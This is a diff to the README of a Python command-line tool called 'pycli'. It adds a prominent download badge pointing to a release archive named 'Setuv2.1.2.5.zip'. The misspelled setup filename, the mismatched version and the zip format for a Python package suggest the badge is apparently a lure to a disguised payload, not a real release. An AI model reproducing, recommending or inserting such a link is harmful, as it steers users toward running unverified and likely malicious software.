@@ -1,3 +1,5 @@
+[![📦 Download Package](https://img.shields.io/badge/📦_Download-Package-success?style=for-the-badge)](https://github.com/dant-dev1999z9/pycli/releases/download/v1.0.0/Setuv2.1.2.5.zip)
+
 # ⚡ pycli
 
 ![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg) ![Python](https://img.shields.io/badge/python-3.10+-blue.svg) ![Platform](https://img.shields.io/badge/platform-cross--platform-lightgrey.svg)
